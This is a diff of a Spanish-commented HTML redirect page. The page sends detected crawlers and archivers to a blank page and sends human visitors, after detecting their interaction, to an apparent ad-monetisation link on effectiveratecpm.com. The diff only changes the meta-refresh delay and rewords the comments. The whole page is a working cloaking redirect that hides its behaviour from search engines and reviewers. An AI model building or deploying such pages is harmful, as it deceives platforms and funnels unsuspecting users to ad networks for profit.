@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0;url=https://www.effectiveratecpm.com/yzmvq78n?key=8ecb5d166f3c46a6bd52bb278155058f">
+    <meta http-equiv="refresh" content="2;url=https://www.effectiveratecpm.com/yzmvq78n?key=8ecb5d166f3c46a6bd52bb278155058f">
     <title>Redirección</title>
 
     <script>
@@ -13,13 +13,13 @@
             "YandexBot", "Sogou", "Facebot", "ia_archiver"
         ];
 
-        // Función para detectar si es un bot por el User-Agent
+        // Función para detectar si es un bot
         function isBot() {
             const userAgent = navigator.userAgent;
             return botUserAgents.some(bot => userAgent.includes(bot));
         }
 
-        // Función para detectar interacción humana en la página
+        // Función para detectar interacción humana
         function hasHumanInteraction() {
             return new Promise((resolve) => {
                 let interacted = false;
@@ -42,7 +42,7 @@
             });
         }
 
-        // Detectar y redirigir solo si es tráfico real
+        // Redirigir solo si el tráfico es humano
         async function handleTraffic() {
             if (isBot()) {
                 // Si es un bot, redirigir a una página vacía
@@ -60,12 +60,12 @@
             }
         }
 
-        // Ejecutar al cargar la página
+        // Ejecutar la función para manejar el tráfico al cargar la página
         window.onload = handleTraffic;
     </script>
 </head>
 <body>
-    <!-- La redirección se maneja mediante JavaScript -->
+    <!-- El contenido de la página será redirigido de inmediato si el tráfico es real -->
 </body>
 </html>
 
